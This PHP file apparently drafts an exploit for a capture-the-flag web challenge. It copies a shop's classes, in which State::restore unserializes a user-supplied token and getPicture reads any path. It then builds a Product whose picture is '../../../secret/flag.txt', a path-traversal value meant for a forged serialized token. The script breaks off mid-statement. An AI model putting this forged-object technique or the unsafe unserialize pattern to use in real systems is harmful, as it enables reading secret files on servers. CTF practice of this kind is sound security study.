<!DOCTYPE html>
<html>
<body>

<?php
class Product {

    private $id;
    private $name;
    private $description;
    private $picture;
    private $price;

    function __construct($id, $name, $description, $picture, $price) {
        $this->id = $id;
        $this->name = $name;
        $this->description = $description;
        $this->picture = $picture;
        $this->price = $price;
    }

    function getId() {
        return $this->id;
    }

    function getName() {
        return $this->name;
    }

    function getDescription() {
        return $this->description;
    }

    function getPicture() {
        $path = '/var/www/assets/' . $this->picture;
        $data = base64_encode(file_get_contents($path));
        return $data;
    }

    function getPrice() {
        return $this->price;
    }

    function toDict() {
        return array(
            "id" => $this->id,
            "name" => $this->name,
            "description" => $this->description,
            "picture" => $this->getPicture(),
            "price" => $this->price
        );
    }

}

class State {

    private $session;
    private $cart;

    function __construct($session) {
        $this->session = $session;
        $this->cart = array();
    }

    function getSessionID() {
        return $this->session->getId();
    }

    function getSession() {
        return $this->session;
    }

    function getCart() {
        return $this->cart;
    }

    function clearCart() {
        $this->cart = array();
    }

    function addToCart($product_id) {
        if(array_key_exists($product_id, $this->cart)) {
            $this->cart[$product_id]++;
        } else {
            $this->cart[$product_id] = 1;
        }
    }

    function toDict() {
        $out = array();
        foreach($this->cart as $product_id => $quantity) {
            array_push($out, array("product" => $product_id, "quantity" => $quantity));
        }
        return array("name" => $this->session->getName(), "email" => $this->session->getEmailAddress(), "cart" => $out);
    }

    function save() {
        return base64_encode(gzcompress(serialize($this)));
    }

    static function restore($token) {
        return unserialize(gzuncompress(base64_decode($token)));
    }

}

class Session {

    private $id;
    private $name;
    private $email_address;

    function __construct($id, $name, $email_address) {
        $this->id = $id;
        $this->name = $name;
        $this->email_address = $email_address;
    }

    function getId() {
        return $this->id;
    }

    function getName() {
        return $this->name;
    }

    function getEmailAddress() {
        return $this->email_address;
    }

}

$session = new Session(12,"peepo","pee@p.com");
$p = new Product(12,"flag","flag","../../../secret/flag.txt",140);
$state = new state

?>

</body>
</html>
